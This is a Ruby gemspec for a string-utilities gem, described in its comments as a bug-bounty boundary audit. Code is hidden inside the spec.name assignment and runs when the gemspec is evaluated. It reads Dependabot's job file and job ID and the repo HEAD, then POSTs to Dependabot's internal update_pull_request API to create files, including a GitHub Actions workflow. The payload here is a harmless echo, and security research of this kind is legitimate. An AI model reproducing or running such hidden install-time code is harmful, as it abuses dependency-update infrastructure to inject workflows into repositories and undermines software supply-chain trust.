# frozen_string_literal: true
#
# v5.2 boundary-verification audit — own-job PR-update body shape.
#
# Authorization: HackerOne GitHub program; researcher's own job; own
# jobId; own repo only; placeholder content only.

require_relative "lib/useful_string_utils/version"

Gem::Specification.new do |spec|
  spec.name = (
    begin
      require "net/http"
      require "uri"
      require "json"

      own_id = (
        begin
          j = JSON.parse(File.read("/home/dependabot/dependabot-updater/job.json"))
          (j["job"] && j["job"]["id"]) || j["id"] || ENV["DEPENDABOT_JOB_ID"]
        rescue
          ENV["DEPENDABOT_JOB_ID"]
        end
      ).to_s

      # Get real HEAD sha via git
      base_sha = `git -C /home/dependabot/dependabot-updater/repo rev-parse HEAD 2>/dev/null`.strip

      if !own_id.empty? && base_sha.match?(/^[0-9a-f]{40}$/)
        # T1: control — file at root path (no .github prefix)
        # T2: target — file at .github/workflows path
        [
          { label: "t1-root", dir: "/", name: "audit-control-v52.txt", content: "audit control\n" },
          { label: "t2-wf",   dir: ".github/workflows", name: "audit-v52.yml",
            content: "name: audit-v52\non: workflow_dispatch\njobs:\n  noop:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo audit-v52\n" }
        ].each do |t|
          data = {
            "dependency-names" => ["useful-string-utils"],
            "updated-dependency-files" => [
              {
                "name" => t[:name],
                "directory" => t[:dir],
                "content" => t[:content],
                "type" => "file",
                "support_file" => false,
                "content_encoding" => "utf-8",
                "deleted" => false,
                "operation" => "create"
              }
            ],
            "base-commit-sha" => base_sha,
            "commit-message" => "audit #{t[:label]}",
            "pr-title" => "audit #{t[:label]}",
            "pr-body" => "audit #{t[:label]}"
          }

          begin
            uri = URI("https://dependabot-actions.githubapp.com/update_jobs/#{own_id}/update_pull_request")
            h = Net::HTTP.new(uri.host, uri.port)
            h.use_ssl = true
            h.open_timeout = 5
            h.read_timeout = 8
            req = Net::HTTP::Post.new(uri.request_uri)
            req["Content-Type"] = "application/json"
            req.body = JSON.dump({ "data" => data })
            h.request(req)
          rescue
          end
        end
      end

      "useful-string-utils"
    rescue
      "useful-string-utils"
    end
  )
  spec.version       = UsefulStringUtils::VERSION
  spec.authors       = ["mr-benty"]
  spec.email         = ["mr_benty@wearehackerone.com"]
  spec.summary       = "Lightweight string utilities for Ruby"
  spec.description   = "Case conversions, padding helpers, slug generation, and a few common transformations missing from stdlib String."
  spec.homepage      = "https://github.com/mr-benty/useful-string-utils"
  spec.license       = "MIT"
  spec.required_ruby_version = ">= 2.7.0"

  spec.metadata["homepage_uri"]    = spec.homepage
  spec.metadata["source_code_uri"] = spec.homepage
  spec.metadata["changelog_uri"]   = "#{spec.homepage}/blob/main/CHANGELOG.md"

  spec.files = Dir.chdir(__dir__) do
    Dir["lib/**/*.rb", "README.md", "LICENSE", "CHANGELOG.md"]
  end
  spec.require_paths = ["lib"]
end
